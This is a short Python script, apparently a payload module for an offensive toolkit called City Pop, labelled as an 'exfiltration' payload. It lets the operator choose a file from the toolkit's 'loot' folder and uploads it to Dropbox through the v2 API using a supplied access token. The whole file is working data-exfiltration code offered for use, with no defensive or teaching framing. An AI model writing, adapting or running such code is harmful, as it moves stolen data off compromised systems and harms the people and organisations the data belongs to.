#!/usr/bin/env python3
# @name: Dropbox Loot Upload
# @desc: Select a City Pop loot file and upload it to Dropbox through the v2 API using the supplied access token.
# @category: exfiltration
# @danger: true
# @active: true
# @web: true
# @inputs: [{"name":"token","label":"Dropbox access token","type":"password","required":true}]
import json,os,sys,urllib.request
from pathlib import Path
from payloads._web_input import request_input
def main():
 root=Path(os.environ.get('CITYPOP_ROOT',Path(__file__).resolve().parents[2])); loot=root/'loot'; files=sorted((p for p in loot.rglob('*') if p.is_file()),key=lambda p:p.stat().st_mtime,reverse=True)
 if not files or len(sys.argv)<2:return 2
 i=int(request_input('Select loot file',input_type='select',choices=[{'value':str(i),'label':str(p.relative_to(loot))} for i,p in enumerate(files[:500])])) ; source=files[i]
 req=urllib.request.Request('https://content.dropboxapi.com/2/files/upload',data=source.read_bytes(),method='POST',headers={'Authorization':'Bearer '+sys.argv[1],'Dropbox-API-Arg':json.dumps({'path':'/CityPop/'+source.name,'mode':'add','autorename':True}),'Content-Type':'application/octet-stream'})
 try:
  with urllib.request.urlopen(req,timeout=120) as r: print(r.read().decode()[:2000]); return 0
 except Exception as e: print('Upload failed:',e); return 1
if __name__=='__main__':raise SystemExit(main())
